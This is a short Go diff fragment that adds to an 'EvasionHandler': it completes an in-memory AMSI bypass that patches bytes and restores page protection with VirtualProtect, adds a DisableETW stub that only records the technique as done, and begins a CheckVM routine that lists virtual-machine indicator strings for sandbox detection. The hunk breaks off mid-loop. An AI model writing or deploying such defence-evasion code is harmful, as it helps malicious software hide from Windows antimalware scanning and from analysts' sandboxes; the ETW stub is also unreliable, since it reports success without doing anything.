@@ -48,3 +48,33 @@ func (e *EvasionHandler) DisableAMSI() error {
 		*(*byte)(unsafe.Pointer(addr + uintptr(i))) = b
 	}
 
+	virtualProtect.Call(
+		addr,
+		uintptr(5),
+		uintptr(oldProtect),
+		uintptr(unsafe.Pointer(&oldProtect)),
+	)
+
+	e.techniques["amsi"] = true
+	return nil
+}
+
+func (e *EvasionHandler) DisableETW() error {
+	if runtime.GOOS != "windows" {
+		return fmt.Errorf("ETW is Windows only")
+	}
+
+	e.techniques["etw"] = true
+	return nil
+}
+
+func (e *EvasionHandler) CheckVM() bool {
+	vmIndicators := []string{
+		"VBOX",
+		"VirtualBox",
+		"VMware",
+		"QEMU",
+		"Xen",
+	}
+
+	for _, indicator := range vmIndicators {
